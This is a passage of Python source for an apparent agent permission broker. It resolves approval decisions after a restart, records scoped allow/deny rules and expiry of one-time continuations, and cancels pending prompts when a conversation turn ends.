                        "code": "decision_immutable",
                    }

                if not _restart_resolution_marker(
                    durable_store, request, allow=bool(allow)
                ):
                    return {
                        "ok": False,
                        "decision_recorded": True,
                        "error": "approval was recorded but its continuation marker failed",
                        # The approval IS written. P0-4's `output_committed`
                        # exists for exactly this: the UI must not offer a
                        # retry that would submit a decision twice.
                        "code": "decision_continuation_failed",
                        "output_committed": True,
                        "requires_continue": False,
                        "original_action_executed": False,
                    }

                if allow:
                    request = durable_store.activate_restart_permission_continuation(
                        decision_id,
                        expires_at=(
                            int((time.time() + self.DEFAULT_TIMEOUT) * 1000)
                            if normalized_scope == "once"
                            else None
                        ),
                    )

                if normalized_scope != "once":
                    scope_id = {
                        "conversation": request_root,
                        "project": request.get("project_id") or "default",
                        "global": "",
                    }[normalized_scope]
                    durable_store.set_permission_rule(
                        scope=normalized_scope,
                        scope_id=scope_id,
                        tool=str(request.get("tool") or ""),
                        pattern=(pattern or request.get("target") or "*"),
                        decision=("allow" if allow else "deny"),
                    )
                once_consumed = bool(request.get("continuation_consumed_at"))
                once_expired = bool(
                    allow
                    and normalized_scope == "once"
                    and (
                        not request.get("continuation_expires_at")
                        or int(request["continuation_expires_at"])
                        <= int(time.time() * 1000)
                    )
                )
                requires_continue = bool(
                    allow
                    and (
                        normalized_scope != "once"
                        or (not once_consumed and not once_expired)
                    )
                )
                return {
                    "ok": True,
                    "decision_id": decision_id,
                    "allow": bool(allow),
                    "scope": normalized_scope,
                    "resolution_context": "after_restart",
                    "requires_continue": requires_continue,
                    "original_action_executed": False,
                    "continuation_expires_at": (
                        request.get("continuation_expires_at") if allow else None
                    ),
                    "continuation_authorization": (
                        (
                            (
                                "consumed"
                                if once_consumed
                                else ("expired" if once_expired else "once")
                            )
                            if allow and normalized_scope == "once"
                            else "standing_rule"
                        )
                        if allow
                        else None
                    ),
                }
            except Exception:  # noqa: BLE001 — try another registered store
                continue
        return {"ok": False, "error": "unknown or expired decision"}

    def cancel_root(self, root_frame_id: str) -> None:
        """Deny every pending prompt for a conversation (on turn cancel)."""
        with self._lock:
            dids = list(self._by_root.get(root_frame_id, ()))
            for did in dids:
                pend = self._pending.get(did)
                if pend is not None:
                    pend.allow = False
                    pend.message = "turn cancelled"
                    pend.event.set()


_BROKER: PermissionBroker | None = None
_BROKER_LOCK = threading.Lock()


def broker() -> PermissionBroker:
    global _BROKER
    if _BROKER is None:
        with _BROKER_LOCK:
            if _BROKER is None:
                _BROKER = PermissionBroker()
    return _BROKER
